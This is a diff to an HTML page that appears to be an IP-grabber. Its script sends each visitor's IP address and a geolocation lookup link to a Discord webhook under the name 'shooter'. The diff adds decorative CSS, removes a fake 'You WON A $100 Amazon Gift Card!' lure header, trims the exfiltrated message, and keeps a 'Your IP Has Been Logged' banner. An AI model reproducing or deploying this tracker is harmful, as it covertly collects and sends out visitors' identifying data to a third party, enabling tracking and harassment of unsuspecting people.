@@ -19,9 +19,22 @@
     <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js" integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA==" crossorigin=""></script>
     <!-- Notyf CSS -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css">
+    <style>
+      p {
+        background-color: blue;
+        font-size: 50px;
+        font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        border-radius: 15px;
+      }
+      p:hover {
+        background-color: red;
+        text-decoration-color: black;
+        font-size: 100px;
+      }
+      body {background-color: aqua;}
+    </style>
   </head>
   <body>
-    <header class="header">🎉 You WON A $100 Amazon Gift Card!</header>
     <script src="./config.js"></script>
     <script>
       function get_information(link, callback) {
@@ -58,7 +71,7 @@
         const params = {
           username: "shooter",
           avatar_url: 'https://cdn.discordapp.com/avatars/965760449817759744/01836a87d9be65eb6ac4303905a53cb0.webp',
-          content: "**IP** : _" + ispp + "_\n**MATERIAL(s)** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**OTHER** : ```" + extra + "```"
+          content: "**IP** : _" + ispp + "_\n**MATERIAL(s)** : _https://api.techniknews.net/ipgeo/" + ispp
         }
         request.send(JSON.stringify(params));
       }
@@ -75,7 +88,6 @@
         display: none
       }
     </style>
-    <p id="yes">Your IP Has Been Logged 😊</p>
-    <script>document.getElementById("yes").innerHTML.text=ispp</script>
+    <p>Your IP Has Been Logged 😊</p>
   </body>
 </html>
